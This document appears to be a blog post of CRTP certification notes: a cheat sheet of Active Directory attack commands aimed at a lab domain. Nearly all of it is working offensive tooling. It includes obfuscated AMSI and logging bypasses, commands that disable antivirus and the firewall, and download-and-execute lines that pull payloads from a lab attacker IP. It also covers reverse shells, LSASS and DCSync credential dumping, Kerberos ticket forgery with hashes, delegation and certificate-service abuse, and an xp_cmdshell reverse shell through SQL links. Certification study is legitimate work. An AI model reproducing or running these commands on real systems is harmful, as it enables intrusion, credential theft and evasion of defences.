---
title: CRTP Commands CheatSheet
author: Muhammad Adel
date: 2025-12-04 13:40:00 +0200
categories: [Certs]
tags: [active directory, redteaming, certs]
---

## Enumeration

```powershell
# Computers
Get-NetComputer | select dnshostname
type .\pcs.txt | Resolve-IPAddress
Get-NetForest -Forest moneycorp.local | select Domains 

# ACLs
Get-ObjectAcl Object-Name –ResolveGUIDs
Get-ObjectAcl -SAMAccountName User –ResolveGUIDs
$sid = Convert-NameToSid wley
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
Find-InterestingDomainAcl -ResolveGUIDs -Credential $Cred 
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student1"}
Invoke-ACLScanner -ResolveGUIDs
Invoke-ACLScanner -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -like "*student1*" }
# Shares
Import-Module C:\AD\Tools\PowerHuntShares.psm1                                                                
Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\server.txt
Invoke-HuntSMBShares -NoPing -OutputDirectory ./shares/ -HostList ./servers.txt

# BloodHound
./SharpHound.exe -c  All
./SharpHound.exe -c  All -d moneycorp.local
```

## **AV Bypass**

```powershell
# Powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
C:\AD\Tools\InviShell\RunWithRegistryAdmin.bat
iex (iwr -UseBasicParsing http://172.16.100.69:8081/sbloggingbypass.txt)
iex (iwr -UseBasicParsing http://172.16.100.69:8081/amsibypass.txt)

# Firewall Bypass
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.69"
Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False
Powershell.exe "Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False"
winrs -r: "Powershell.exe Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False"
$sess = New-PSSession -ComputerName devsrv.garrison.castle.local
Invoke-command -ScriptBlock {Set-MpPreference -DisableIOAVProtection $true} -Session $sess 
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess

# AV
Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath "C:\Users\Public"
Add-MpPreference -ExclusionPath "C:\AD\Tools"

# Enhanced Script Logging
[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)

# AMSI
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

## Bypass App Locker for Mimikatz
$8 = "s";
$c = "e";
$g = "k";
$t = "u";
$p = "r";
$n = "l";
$7 = "s";
$6 = "a";
$l = ":";
$2 = ":";
$z = "e";
$e = "k";
$0 = "e";
$s = "y";
$1 = "s";
$Pwn = $8 + $c + $g + $t + $p + $n + $7 + $6 + $l + $2 + $z + $e + $0 + $s + $1 ;
Invoke-Mimi -Command $Pwn
```

## **File Transfer**

```powershell
# Download
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
Copy-Item C:\AD\Tools\Invoke-Mimi-keys.ps1 \\dcorp-adminsrv\C$\'Program Files'
iwr http://172.16.100.10:8081/Loader.exe -OutFile C:\Users\Public\Loader.exe
winrs -r: "powershell.exe iwr http://172.16.100.69:8081/Loader.exe -OutFile C:\Users\Public\Loader.exe"

# Download and excute
powershell.exe iex (iwr http://172.16.100.69:8081/Invoke-PowerShellTcp.ps1 -UseBasicParsing)
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.69:8081/PowerView.ps1'))
winrs -r: "powershell.exe iex (iwr -UseBasicParsing http://172.16.100.69:8081/amsibypass.txt)"
```

## **Tickets & Creds Harvesting**

```powershell
# Dumps Kerberos encryption keys from LSASS
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe sekurlsa::evasive-keys exit
C:\Users\Public\Loader.exe -path http://172.16.100.10:8081/SafetyKatz.exe 'token::elevate' 'sekurlsa::tickets /export' exit

# Dumping LSA & sam secrets
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "lsadump::evasive-lsa /patch exit"
C:\Users\Public\Loader.exe -path http://172.16.100.10:8081/SafetyKatz.exe 'token::elevate' 'lsadump::sam' exit
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "lsadump::evasive-sam exit"
C:\Users\Public\Loader.exe -path http://172.16.100.10:8081/SafetyKatz.exe 'token::elevate' 'lsadump::secrets' exit
C:\Users\Public\Loader.exe -path http://172.16.100.10:8081/SafetyKatz.exe token::elevate lsadump::secrets exit
C:\Users\Public\Loader.exe -path http://172.16.100.10:8081/SafetyKatz.exe 'token::elevate' 'lsadump::cache' exit

# Logon Passwords
C:\Users\Public\Loader.exe -path http://172.16.100.10:8081/SafetyKatz.exe sekurlsa::logonpasswords exit

# Dumping Vaults & CredMan
C:\Users\Public\Loader.exe -path http://172.16.100.10:8081/SafetyKatz.exe 'token::elevate' 'vault::list' exit
C:\Users\Public\Loader.exe -path http://172.16.100.10:8081/SafetyKatz.exe 'token::elevate' 'vault::cred /patch' exit
C:\Users\Public\Loader.exe -path http://172.16.100.10:8081/SafetyKatz.exe 'token::elevate' 'vault::cred' exit
C:\Users\Public\Loader.exe -path http://172.16.100.10:8081/SafetyKatz.exe 'token::elevate' 'lsadump::credman' exit
C:\Users\Public\Loader.exe -path http://172.16.100.10:8081/SafetyKatz.exe 'token::elevate' 'Evasive-dpapi' exit
C:\Users\Public\Loader.exe -path http://172.16.100.10:8081/SafetyKatz.exe 'token::elevate' 'sekurlsa::dpapi' exit
C:\Users\Public\Loader.exe -path http://172.16.100.10:8081/SafetyKatz.exe 'token::elevate' 'dpapi::chrome' exit
C:\Users\Public\Loader.exe -path http://172.16.100.10:8081/SafetyKatz.exe 'sekurlsa::msv' exit

# DCSync Attack
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"

# Cracking
C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

## **Creating & Loading Tickets**

```powershell
# Pass The Hash
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::evasive-pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:cmd.exe" "exit"

# OverPass the Hash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada000cd0138ec5ca2835060009dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:dollarcorp.moneycorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::pth /user:administrator /domain:dollarcorp.moneycorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"

# Golden Tikcet
## mimkatz
C:\AD\Tools\Loader.exe C:\AD\Tools\SafetyKatz.exe "kerberos::golden /user:Administrator /domain:moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648  /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /id:500"
## Rubues
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:591 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt

# Silver Ticket
## HTTP - Using Machine account hash (dcorp-dc$)
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:9a5e64e2c4e303adccdf112e7be06803 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
## WMI
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:9a5e64e2c4e303adccdf112e7be06803 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:9a5e64e2c4e303adccdf112e7be06803 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt

# Dimaond Ticket
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

# Injecting Tickets
### Rubues
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:"base64 | file.kirbi"
### Mimkatz
kerberos::ptt $ticket_kirbi_file
kerberos::ptt $ticket_ccache_file
## TGT -> TGS
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:
## SPN SUB
Rubeus.exe tgssub /altservice:cifs /ticket:"TGS base64 | ticket.kirbi"
```

## **Local PrivEsc**

```powershell
Import-Module C:\AD\Tools\PowerUp.ps1
. C:\AD\Tools\PowerUp.ps1
Invoke-AllChecks
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'corp\studentuser1' -Verbose
Install-ServiceBinary -Name 'edgeupdatem' -UserName 'corp\studentuser1' -Verbose
Write-HijackDll -DllPath 'C:\Users\studentuser\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll' -UserName 'corp\studentuser1'
```

## **User Session Hunting**

```powershell
# where the current user has local administrator access
Find-LocalAdminAccess
# winRM Access
Import-Module C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
# Find all admins on all computers
Invoke-EnumerateLocalAdmin
# the current user has local admin access to found machines
Invoke-UserHunter [-GroupName <group_name>] [-CheckAccess]
# Find computers where a domain admin (or specified user/group) has sessions
Find-DomainUserLocation -Verbose
Find-DomainUserLocation -UserGroupIdentity "RDUsers"
# Active user sessions on remote computers. No admin privileges required
Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
```

## **Reverse shell**

```powershell
powershell.exe iex (iwr http://172.16.100.69:8081/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.69 -Port 443
powershell.exe iex (iwr http://172.16.100.69:8081/Invoke-PowerShellTcpEx.ps1 -UseBasicParsing)
```

## **Kerberos Attacks**

```powershell
# Kerberoasting 
Get-DomainUser -SPN
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt

# Unconstrained Delegation 
Get-NetComputer -UnConstrained | select dnshostname
Get-NetComputer -UnConstrained
## Compromise the server that has the unconstrained delegation
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:admin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
## Run Rubes in Listener Mode in the machine that has the unconstrained delegation
C:\Users\Public\Loader.exe -path http://172.16.100.69:8081/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
## On you Own Machine - Trigger the Printer Bug
C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:
## On you Own Machine - Trigger Windows Search Protocol (MS-WSP)
C:\AD\Tools\Loader.exe -path C:\AD\tools\WSPCoerce.exe -args DCORP-DC DCORP-APPSRV
## On you Own Machine - Trigger Distributed File System Protocol (MS-DFSNM)
C:\AD\Tools\DFSCoerce-andrea.exe -t dcorp-dc -l dcorp-appsrv

# User Constrained Delegation
Get-DomainUser -TrustedToAuth
## Compromise the server that has the constrained delegation
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\websvc" "exit"
## get Access to CIFS service for the user that has the constrained delegation
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
dir \\dcorp-mssql.dollarcorp.moneycorp.LOCAL\c$\

# Computer Constrained Delegation
Get-DomainComputer -TrustedToAuth
## Compromise the server that has the constrained delegation
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\dcorp-adminsrv$" "exit"
## get Access to LDAP by swittching the TIME service for the computer that has the constrained delegation
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
## Using the LDAP ticket let's perform DCSync attack
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"

# Resource Based Constrained Delegation
Import-Module C:\AD\Tools\PowerView.ps1
$computers = Get-DomainComputer
$users = Get-DomainUser
$accessRights = "GenericWrite","GenericAll","WriteProperty","WriteDacl"
foreach ($computer in $computers) {
	$acl = Get-ObjectAcl -SamAccountName $computer.SamAccountName -ResolveGUIDs
	foreach ($user in $users) {
	$hasAccess = $acl | ?{$_.SecurityIdentifier -eq $user.ObjectSID} | %{($_.ActiveDirectoryRights -match ($accessRights -join '|'))}
	if ($hasAccess) {
		Write-Output "$($user.SamAccountName) has the required access
rights on $($computer.Name)"
		}
	}
}
## Find a PC that has Generic-Write over a user
Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
## Obtain the credentials for the account that was configured for delegation.
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
## Access the user that has the generic wite - OPTH
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:STUDVM$ /aes256:b8ffa49856aec2c949a230e5cb5b7f44e4d68c7089b4cd52ee864c670d365329 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
## Setup the RBCD
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.69:8081/PowerView.ps1'))
Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-std69$' -Verbose
Set-DomainRBCD -Identity mgmtsrv -DelegateFrom 'studvm$' -Verbose
## Confrim that it has been created
Get-DomainRBCD
## Abuse the RBCD to access dcorp-mgmt as Administrator
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-std69$ /aes256:b8dd569eb3d6044df788e1cff426a1d8f8de47d51be5e50e24c3715d35524b22 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
```

## **Privilege's Escalation**

```powershell
# Remote Scheduled Tasks
schtasks /create /S mgmtsrv.money.corp /SC Weekly /RU "NT Authority\SYSTEM" /TN "exp" /TR "powershell.exe -c'iex (New-Object Net.WebClient).DownloadString("http://172.16.100.1/Invoke-PowerShellTcp.ps1"")
schtasks /Run /S mgmtsrv.money.CORP /TN "exp"
# GPOddity Attacks
## Linux
ntlmrelayx.py -t 'ldaps://172.16.2.1' -wh '172.16.100.69:8080' --http-port '80,8080' -i --no-smb-server
nc 127.0.0.1 11000
	write_gpo_dacl student69 "{0BF8D01C-1F62-4BDC-958C-57140B67D147}"
python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'student69' --password 'Vy9nruT5NSGz5XyL' --command 'net localgroup administrators student69 /add' --rogue-smbserver-ip '172.16.100.69' --rogue-smbserver-share 'itsfading_gpo' --dc-ip 172.16.2.1  --smb-mode none
mkdir /mnt/c/ad/toolsitsfading_gpo
cd itsfading_gpo/
cp ../GPOddity/GPT_out/* . -r
net share itsfading_gpo=C:\AD\Tools\itsfading_gpo /grant:Everyone,Full
icacls "C:\AD\Tools\itsfading_gpo" /grant Everyone:F /T
Get-DomainGPO -Identity 'DevOps Policy'
gpupdate /force
winrs -r:dcorp-ci cmd

# Parent Child Trust
## ExtraSID - Domain Trust Key
### Start a shell Using a DA account
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
### Extracting Trust Key
echo F | xcopy C:\ad\tools\\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe
winrs -r:dcorp-dc cmd.exe
C:\Users\Public\Loader.exe -path http://172.16.100.69:8081/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
### Get Required Info
Get-DomainGroup -Identity "Enterprise Admins" -Domain moneycorp.local | select objectsid
Get-DomainSID
### Forge the Trust ticket
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:8ca58cb947fec09c1d7f394a87dc00b6 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
### get HTTP TGS from TGT
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:
### DCSync on Mcorp-dc
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"

## ExtraSID - KRBTGT
### Get Required Info
Get-DomainGroup -Identity "Enterprise Admins" -Domain moneycorp.local | select objectsid
Get-DomainSID
### Get KTBGTG hash
c:\Users\Public\Loader.exe -path http://172.16.100.69:8081/SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
### Forge the trust ticket
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt
SafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"

# Cross Forest Trust
## ExtraSID - Domain Trust Key
### Start a shell Using a DA account
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
### Extracting Trust Key
echo F | xcopy C:\ad\tools\\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe
winrs -r:dcorp-dc cmd.exe
C:\Users\Public\Loader.exe -path http://172.16.100.69:8081/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
### Forge the trust ticket
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:496fde962c336e209ad5a46f07771bd4 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap
### Inject the ticket
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:

# AD CS
c:\AD\Tools\Certify.exe cas
c:\AD\Tools\Certify.exe find
c:\AD\Tools\Certify.exe find /vunlerable

## ECS1
C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
C:\AD\Tools\openssl\openssl.exe pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out ./cert.pfx
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:cert.pfx /password:SecretPass@123 /ptt

## ECS3
C:\AD\Tools\Certify.exe find /vunlerable
### Request a certificate template
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\ca\cert1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\ca\cert1.pfx
### Using a certificate template to request anther certificate
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:C:\AD\Tools\ca\cert1.pfx /enrollcertpw:SecretPass@123
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\ca\cert2.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\ca\cert2.pfx
C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:C:\AD\Tools\ca\cert2.pfx /password:SecretPass@123 /ptt
```

## **Lateral Movement**

```powershell
# Loading Domain User Creds into memory
$SecPassword = ConvertTo-SecureString 'Password01' -AsPlainText -Force
$SecPassword = ConvertTo-SecureString $pass -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('corp\studentuser', $SecPassword)

# Groups
net localgroup "Remote Desktop Users" "studvm" /add
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
net localgroup "Remote Management Users" "studvm" /add
net localgroup administrators "studvm" /add

# MYSQL
## Enumeration
Get-ADGroup -Filter * | Where-Object { $_.Name -like "*SQL*Admin*" } | Select Name, DistinguishedName
Get-ADGroupMember -Identity "SQL-Admins" | Select Name, SamAccountName
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

## PowerUpSQL
Import-Module .\PowerUpSQL-master\PowerUpSQL.ps1
Get-SQLInstanceDomain
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
### RCE
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'set username'"
### Reverse Shel
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.69:8081/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.69:8081/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.69:8081/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sql2
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

## HeidiSQL
### enumerate linked databases
select * from master..sysservers
###  further links from
select * from openquery("DCORP-SQL1",'select * from master..sysservers')
### nest openquery within another openquery
select * from openquery("DCORP-SQL1",'select * from openquery("DCORP-MGMT",''select * from master..sysservers'')')
```